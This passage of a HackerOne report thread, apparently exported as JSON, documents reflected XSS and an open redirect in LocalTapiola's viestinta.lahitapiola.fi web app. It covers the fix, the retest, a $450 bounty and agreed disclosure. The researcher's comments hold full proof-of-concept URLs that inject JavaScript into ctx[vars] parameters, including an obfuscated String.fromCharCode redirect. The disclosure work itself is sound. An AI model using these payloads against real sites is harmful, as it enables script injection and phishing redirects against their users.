in : **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**\nusing this payload **1){} alert(document.domain); if(1.** inside this parameters:\n**ctx[vars][savings]**\n**ctx[vars][accident]**\n**ctx[vars][child]**\n**ctx[vars][seriousIllness]**\n**ctx[vars][contacted]**\n\n**PoC**:\n\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1){} alert(document.domain); if(1.\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e5\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n\n```","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThe same issue can also be found in : \u003cstrong\u003e\u003ca title=\"http://viestinta.lahitapiola.fi/webApp/lapsuudenturva\" href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Flapsuudenturva\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/strong\u003e\u003cbr\u003e\nusing this payload \u003cstrong\u003e1){} alert(document.domain); if(1.\u003c/strong\u003e inside this parameters:\u003cbr\u003e\n\u003cstrong\u003ectx[vars][savings]\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003ectx[vars][accident]\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003ectx[vars][child]\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003ectx[vars][seriousIllness]\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003ectx[vars][contacted]\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u0026lt;ctx lang=\u0026quot;en\u0026quot; _target=\u0026quot;web\u0026quot; webApp-id=\u0026quot;48590459\u0026quot; _folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo datakitInDatabase=\u0026quot;true\u0026quot; homeDir=\u0026quot;\u0026quot; instanceLocale=\u0026quot;en-US\u0026quot; locale=\u0026quot;en-US\u0026quot; login=\u0026quot;webapp\u0026quot; loginCS=\u0026quot;Web applications agent (webapp)\u0026quot; loginId=\u0026quot;3290\u0026quot; noConsoleCnx=\u0026quot;true\u0026quot; orgUnitId=\u0026quot;0\u0026quot; theme=\u0026quot;\u0026quot; timezone=\u0026quot;Europe/Helsinki\u0026quot; xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; xmlns:ns=\u0026quot;urn:xtk:session\u0026quot; xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone current=\u0026quot;Europe/Helsinki\u0026quot; changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;savings\u0026gt;1){} alert(document.domain); if(1.\u0026lt;/savings\u0026gt;\u0026lt;accident\u0026gt;2\u0026lt;/accident\u0026gt;\u0026lt;child\u0026gt;3\u0026lt;/child\u0026gt;\u0026lt;seriousIllness\u0026gt;4\u0026lt;/seriousIllness\u0026gt;\u0026lt;contacted\u0026gt;5\u0026lt;/contacted\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity name=\u0026quot;page2\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;start\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-12-15T18:38:34.368Z","updated_at":"2016-12-15T18:38:34.368Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1368068,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-15T23:46:20.974Z","updated_at":"2016-12-15T23:46:20.974Z","additional_data":{"old_title":"Reflected XSS in viestinta.lahitapiola.fi/webApp/APP3242","new_title":"Reflected XSS in several parameters (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1374914,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, the issues you have found should now have been fixed, you are welcome to re-test.","markdown_message":"\u003cp\u003eHi, the issues you have found should now have been fixed, you are welcome to re-test.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-19T20:07:08.215Z","updated_at":"2016-12-19T20:07:08.215Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1375461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\nHi localtapiola-thomas,\n\nThis issue is not fixed !!\n\nIn **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**  the parameters are now properly filtered, expect for this one: **ctx[vars][contacted]**, which still can be exploited to trigger an XSS, using this payload: \n**1){} alert(document.domain); if(1**\n\n**PoC**\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e1){} alert(document.domain); if(1\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n```\n\nFor the other webApp, i found no issue in them.\n","markdown_message":"\u003cp\u003eHi localtapiola-thomas,\u003c/p\u003e\n\n\u003cp\u003eThis issue is not fixed !!\u003c/p\u003e\n\n\u003cp\u003eIn \u003cstrong\u003e\u003ca title=\"http://viestinta.lahitapiola.fi/webApp/lapsuudenturva\" href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Flapsuudenturva\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/strong\u003e  the parameters are now properly filtered, expect for this one: \u003cstrong\u003ectx[vars][contacted]\u003c/strong\u003e, which still can be exploited to trigger an XSS, using this payload: \u003cbr\u003e\n\u003cstrong\u003e1){} alert(document.domain); if(1\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u0026lt;ctx lang=\u0026quot;en\u0026quot; _target=\u0026quot;web\u0026quot; webApp-id=\u0026quot;48590459\u0026quot; _folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo datakitInDatabase=\u0026quot;true\u0026quot; homeDir=\u0026quot;\u0026quot; instanceLocale=\u0026quot;en-US\u0026quot; locale=\u0026quot;en-US\u0026quot; login=\u0026quot;webapp\u0026quot; loginCS=\u0026quot;Web applications agent (webapp)\u0026quot; loginId=\u0026quot;3290\u0026quot; noConsoleCnx=\u0026quot;true\u0026quot; orgUnitId=\u0026quot;0\u0026quot; theme=\u0026quot;\u0026quot; timezone=\u0026quot;Europe/Helsinki\u0026quot; xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; xmlns:ns=\u0026quot;urn:xtk:session\u0026quot; xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone current=\u0026quot;Europe/Helsinki\u0026quot; changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;savings\u0026gt;1\u0026lt;/savings\u0026gt;\u0026lt;accident\u0026gt;2\u0026lt;/accident\u0026gt;\u0026lt;child\u0026gt;3\u0026lt;/child\u0026gt;\u0026lt;seriousIllness\u0026gt;4\u0026lt;/seriousIllness\u0026gt;\u0026lt;contacted\u0026gt;1){} alert(document.domain); if(1\u0026lt;/contacted\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity name=\u0026quot;page2\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;start\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor the other webApp, i found no issue in them.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-19T22:10:04.860Z","updated_at":"2016-12-19T22:10:04.860Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":145190,"filename":"xss_2.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/190/de82f7d1cad496140eab37396a10c3b8045863c2/xss_2.PNG?response-content-disposition=attachment%3B%20filename%3D%22xss_2.PNG%22%3B%20filename%2A%3DUTF-8%27%27xss_2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044921Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=8256b032acc59ffc06ea80b3adcd77485ace8171735dece7a7ad7701b429c54e"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1389229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI just want to add that this issue can be also  exploited to perform an open redirection, using this payload:\n\n**1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1**\n\n**PoC**:\n```\nhttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u003cctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"\u003e\u003cuserInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\u003clogin-right right=\"admin\"/\u003e\u003c/userInfo\u003e\u003ctimezone current=\"Europe/Helsinki\" changed=\"false\"/\u003e\u003cvars\u003e\u003csavings\u003e1\u003c/savings\u003e\u003caccident\u003e2\u003c/accident\u003e\u003cchild\u003e3\u003c/child\u003e\u003cseriousIllness\u003e4\u003c/seriousIllness\u003e\u003ccontacted\u003e1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1\u003c/contacted\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity name=\"page2\"/\u003e\u003cactivity name=\"start\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\n```\n\nWhen you visit this link, a redirection will be made to **google.com**,","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI just want to add that this issue can be also  exploited to perform an open redirection, using this payload:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/lapsuudenturva?ctx=\u0026lt;ctx lang=\u0026quot;en\u0026quot; _target=\u0026quot;web\u0026quot; webApp-id=\u0026quot;48590459\u0026quot; _folderModel=\u0026quot;nmsRecipient\u0026quot;\u0026gt;\u0026lt;userInfo datakitInDatabase=\u0026quot;true\u0026quot; homeDir=\u0026quot;\u0026quot; instanceLocale=\u0026quot;en-US\u0026quot; locale=\u0026quot;en-US\u0026quot; login=\u0026quot;webapp\u0026quot; loginCS=\u0026quot;Web applications agent (webapp)\u0026quot; loginId=\u0026quot;3290\u0026quot; noConsoleCnx=\u0026quot;true\u0026quot; orgUnitId=\u0026quot;0\u0026quot; theme=\u0026quot;\u0026quot; timezone=\u0026quot;Europe/Helsinki\u0026quot; xmlns:SOAP-ENV=\u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; xmlns:ns=\u0026quot;urn:xtk:session\u0026quot; xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\u0026lt;login-right right=\u0026quot;admin\u0026quot;/\u0026gt;\u0026lt;/userInfo\u0026gt;\u0026lt;timezone current=\u0026quot;Europe/Helsinki\u0026quot; changed=\u0026quot;false\u0026quot;/\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;savings\u0026gt;1\u0026lt;/savings\u0026gt;\u0026lt;accident\u0026gt;2\u0026lt;/accident\u0026gt;\u0026lt;child\u0026gt;3\u0026lt;/child\u0026gt;\u0026lt;seriousIllness\u0026gt;4\u0026lt;/seriousIllness\u0026gt;\u0026lt;contacted\u0026gt;1){} window.location.href = String.fromCharCode(47,47,103,111,111,103,108,101,46,99,111,109); if(1\u0026lt;/contacted\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity name=\u0026quot;page2\u0026quot;/\u0026gt;\u0026lt;activity name=\u0026quot;start\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen you visit this link, a redirection will be made to \u003cstrong\u003egoogle.com\u003c/strong\u003e,\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-28T17:18:26.472Z","updated_at":"2016-12-28T17:18:26.472Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1393783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI noticed that you consider Open Redirection vuln more serious than XSS, so i am asking you if you can change the report's title from XSS only to XSS +  Open Redirection, and consider both the issues in this submission.\n\nbest regards.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI noticed that you consider Open Redirection vuln more serious than XSS, so i am asking you if you can change the report\u0026#39;s title from XSS only to XSS +  Open Redirection, and consider both the issues in this submission.\u003c/p\u003e\n\n\u003cp\u003ebest regards.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-01T19:03:55.669Z","updated_at":"2017-01-01T19:03:55.669Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1393786,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-01T19:08:53.386Z","updated_at":"2017-01-01T19:08:53.386Z","additional_data":{"old_title":"Reflected XSS in several parameters (viestinta.lahitapiola.fi)","new_title":"Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)"},"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1458180,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nI noticed that you fixed this issue, would confirm please !","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI noticed that you fixed this issue, would confirm please !\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T10:18:35.950Z","updated_at":"2017-02-02T10:18:35.950Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1458547,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes indeed - did not have time to update the status yet. Good to hear that you confirm, we will close and resolve this. You OK with public disclosure?","markdown_message":"\u003cp\u003eYes indeed - did not have time to update the status yet. Good to hear that you confirm, we will close and resolve this. You OK with public disclosure?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T14:26:55.398Z","updated_at":"2017-02-02T14:26:55.398Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1458567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, sure, any updates regarding the report #194199, It's been more than a month since the last feedback.","markdown_message":"\u003cp\u003eYes, sure, any updates regarding the report \u003ca href=\"/reports/194199\"\u003e#194199\u003c/a\u003e, It\u0026#39;s been more than a month since the last feedback.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-02T14:33:05.181Z","updated_at":"2017-02-02T14:33:05.181Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"since the issue is fixed now, would you update the status.","markdown_message":"\u003cp\u003esince the issue is fixed now, would you update the status.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-03T23:29:14.627Z","updated_at":"2017-02-03T23:29:14.627Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462556,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for your report...","markdown_message":"\u003cp\u003eThanks for your report...\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-04T09:07:13.576Z","updated_at":"2017-02-04T09:08:39.329Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"sandh0t","url":"/sandh0t"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462558,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"... resolving ...","markdown_message":"\u003cp\u003e... resolving ...\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-04T09:07:59.103Z","updated_at":"2017-02-04T09:08:50.116Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sandh0t","url":"/sandh0t"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462559,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"...and full disclosure.","markdown_message":"\u003cp\u003e...and full disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-04T09:08:26.712Z","updated_at":"2017-02-04T09:08:26.712Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1462656,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks.","markdown_message":"\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-04T11:27:23.543Z","updated_at":"2017-02-04T11:27:23.543Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1521259,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-06T09:08:43.367Z","updated_at":"2017-03-06T09:08:43.367Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"genius_execution_id